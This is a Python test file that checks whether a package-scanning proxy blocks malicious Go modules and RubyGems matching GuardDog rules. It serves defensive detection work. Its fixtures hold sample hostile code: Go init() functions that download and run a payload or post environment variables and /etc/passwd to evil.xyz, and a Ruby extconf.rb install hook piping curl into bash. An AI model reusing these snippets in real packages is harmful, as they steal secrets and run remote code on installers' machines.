"""GuardDog Go + RubyGems rule coverage benchmark.

Validates Guard Proxy detection against all GuardDog source code heuristic rules
for Go (4 rules + shady-links + passwd) and RubyGems (6 rules + passwd).

References:
- https://github.com/DataDog/guarddog
- GuardDog 2.0: YARA + Go + RubyGems support
"""

import shutil
import tempfile
from datetime import UTC, datetime, timedelta
from pathlib import Path

from app.core.config import Settings
from app.decision.engine import DecisionEngine
from app.scanners.base import ScanPipeline
from app.scanners.cooldown import CooldownScanner
from app.scanners.heuristics_scanner import HeuristicsScanner
from app.scanners.ioc_checker import IOCScanner
from app.scanners.metadata_scanner import MetadataScanner
from app.scanners.static_analysis_go import GoStaticAnalysisScanner
from app.scanners.static_analysis_rubygems import RubyGemsStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _s():
    return Settings(decision_mode="enforce", cooldown_days=7, cooldown_action="deny")


async def _blocked_go(files, age=24, name="github.com/evil/pkg"):
    s = _s()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    arts = []
    for fname, content in files.items():
        p = tmp / fname
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
        arts.append(p)
    pkg = PackageInfo(
        name=name,
        version="v1.0.0",
        registry="go",
        publish_date=datetime.now(UTC) - timedelta(hours=age),
    )
    scanners = [IOCScanner(), CooldownScanner(s), MetadataScanner(), GoStaticAnalysisScanner(s), HeuristicsScanner()]
    results = await ScanPipeline(scanners).run(pkg, arts)
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    return decision.verdict in ("deny", "quarantine")


async def _blocked_gems(files, age=24, name="test-gem"):
    s = _s()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    arts = []
    for fname, content in files.items():
        p = tmp / fname
        p.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            p.write_bytes(content)
        else:
            p.write_text(content)
        arts.append(p)
    pkg = PackageInfo(
        name=name,
        version="1.0.0",
        registry="rubygems",
        publish_date=datetime.now(UTC) - timedelta(hours=age),
    )
    scanners = [
        IOCScanner(),
        CooldownScanner(s),
        MetadataScanner(),
        RubyGemsStaticAnalysisScanner(s),
        HeuristicsScanner(),
    ]
    results = await ScanPipeline(scanners).run(pkg, arts)
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    return decision.verdict in ("deny", "quarantine")


# ========================================================================
# GuardDog Go Source Code Heuristics (4 rules + shady-links + passwd)
# ========================================================================


async def test_gd_go_01_exec_base64():
    """GuardDog: go-exec-base64 — base64 decode + exec in Go"""
    assert await _blocked_go(
        {
            "main.go": """package main
import (
    "encoding/base64"
    "os/exec"
)
func init() {
    decoded, _ := base64.StdEncoding.DecodeString("Y3VybCBldmlsLnh5eg==")
    exec.Command("sh", "-c", string(decoded)).Run()
}
"""
        }
    )


async def test_gd_go_02_exec_download():
    """GuardDog: go-exec-download — download and execute in Go"""
    assert await _blocked_go(
        {
            "main.go": """package main
import (
    "net/http"
    "os/exec"
    "io"
    "os"
)
func init() {
    resp, _ := http.Get("https://evil.xyz/payload")
    f, _ := os.Create("/tmp/payload")
    io.Copy(f, resp.Body)
    f.Close()
    exec.Command("chmod", "+x", "/tmp/payload").Run()
    exec.Command("/tmp/payload").Run()
}
"""
        }
    )


async def test_gd_go_03_exfiltrate_sensitive_data():
    """GuardDog: go-exfiltrate-sensitive-data — env var exfiltration"""
    assert await _blocked_go(
        {
            "main.go": """package main
import (
    "net/http"
    "os"
    "strings"
)
func init() {
    envs := os.Environ()
    data := strings.Join(envs, "\\n")
    http.Post("https://evil.xyz/collect", "text/plain", strings.NewReader(data))
}
"""
        }
    )


async def test_gd_go_04_shady_links():
    """GuardDog: shady-links — suspicious URLs in Go code"""
    assert await _blocked_go(
        {
            "main.go": """package main
import "net/http"
func init() {
    http.Get("https://malware.xyz/payload")
}
"""
        }
    )


async def test_gd_go_05_passwd_access():
    """GuardDog: suspicious_passwd_access_linux — /etc/passwd in Go"""
    assert await _blocked_go(
        {
            "main.go": """package main
import (
    "os"
    "net/http"
    "strings"
)
func init() {
    data, _ := os.ReadFile("/etc/passwd")
    http.Post("https://evil.xyz", "text/plain", strings.NewReader(string(data)))
}
"""
        }
    )


# ========================================================================
# GuardDog RubyGems Source Code Heuristics (6 rules + passwd)
# ========================================================================


async def test_gd_gems_01_code_execution():
    """GuardDog: rubygems-code-execution — dynamic eval/exec"""
    assert await _blocked_gems({"extconf.rb": "eval(File.read('/tmp/payload.rb'))"})


async def test_gd_gems_02_exec_base64():
    """GuardDog: rubygems-exec-base64 — base64 decode + eval"""
    assert await _blocked_gems({"extconf.rb": "require 'base64'\neval(Base64.decode64('cHV0cyAiSGVsbG8i'))"})


async def test_gd_gems_03_exfiltrate_sensitive_data():
    """GuardDog: rubygems-exfiltrate-sensitive-data — env + HTTP"""
    assert await _blocked_gems(
        {"extconf.rb": "require 'net/http'\nNet::HTTP.get(URI('https://evil.xyz/?d=' + ENV.to_h.to_s))"}
    )


async def test_gd_gems_04_install_hook():
    """GuardDog: rubygems-install-hook — malicious extconf.rb"""
    assert await _blocked_gems({"extconf.rb": "system('curl https://evil.xyz/steal|bash')"})


async def test_gd_gems_05_network_on_require():
    """GuardDog: rubygems-network-on-require — network access on load"""
    assert await _blocked_gems(
        {"lib/evil.rb": "require 'net/http'\nNet::HTTP.get(URI('https://evil.xyz/exfil?d=' + ENV.to_h.to_s))"}
    )


async def test_gd_gems_06_serialize_environment():
    """GuardDog: rubygems-serialize-environment — serialize ENV"""
    assert await _blocked_gems(
        {"extconf.rb": "require 'json'\nrequire 'net/http'\nNet::HTTP.post(URI('https://evil.xyz'), ENV.to_h.to_json)"}
    )


async def test_gd_gems_07_passwd_access():
    """GuardDog: suspicious_passwd_access_linux — /etc/passwd in Ruby"""
    assert await _blocked_gems(
        {
            "extconf.rb": "data = File.read('/etc/passwd')\nrequire 'net/http'\nNet::HTTP.get(URI('https://evil.xyz/?d=' + data))"
        }
    )


# ========================================================================
# Summary
# ========================================================================

_GO_RESULTS = {}
_GEMS_RESULTS = {}


async def test_summary_go():
    """Go GuardDog coverage summary."""
    tests = {
        "go-exec-base64": test_gd_go_01_exec_base64,
        "go-exec-download": test_gd_go_02_exec_download,
        "go-exfiltrate-sensitive-data": test_gd_go_03_exfiltrate_sensitive_data,
        "shady-links (go)": test_gd_go_04_shady_links,
        "suspicious_passwd_access_linux (go)": test_gd_go_05_passwd_access,
    }
    passed = 0
    total = len(tests)
    for name, test_fn in tests.items():
        try:
            await test_fn()
            passed += 1
            _GO_RESULTS[name] = "PASS"
        except AssertionError:
            _GO_RESULTS[name] = "FAIL"

    rate = passed / total * 100
    print(f"\n{'=' * 60}")
    print(f"GuardDog Go coverage: {passed}/{total} ({rate:.0f}%)")
    for name, status in _GO_RESULTS.items():
        icon = "+" if status == "PASS" else "-"
        print(f"  [{icon}] {name}")
    print(f"{'=' * 60}")
    assert rate >= 80, f"Go detection rate {rate:.0f}% below 80% target"


async def test_summary_rubygems():
    """RubyGems GuardDog coverage summary."""
    tests = {
        "rubygems-code-execution": test_gd_gems_01_code_execution,
        "rubygems-exec-base64": test_gd_gems_02_exec_base64,
        "rubygems-exfiltrate-sensitive-data": test_gd_gems_03_exfiltrate_sensitive_data,
        "rubygems-install-hook": test_gd_gems_04_install_hook,
        "rubygems-network-on-require": test_gd_gems_05_network_on_require,
        "rubygems-serialize-environment": test_gd_gems_06_serialize_environment,
        "suspicious_passwd_access_linux (gems)": test_gd_gems_07_passwd_access,
    }
    passed = 0
    total = len(tests)
    for name, test_fn in tests.items():
        try:
            await test_fn()
            passed += 1
            _GEMS_RESULTS[name] = "PASS"
        except AssertionError:
            _GEMS_RESULTS[name] = "FAIL"

    rate = passed / total * 100
    print(f"\n{'=' * 60}")
    print(f"GuardDog RubyGems coverage: {passed}/{total} ({rate:.0f}%)")
    for name, status in _GEMS_RESULTS.items():
        icon = "+" if status == "PASS" else "-"
        print(f"  [{icon}] {name}")
    print(f"{'=' * 60}")
    assert rate >= 80, f"RubyGems detection rate {rate:.0f}% below 80% target"
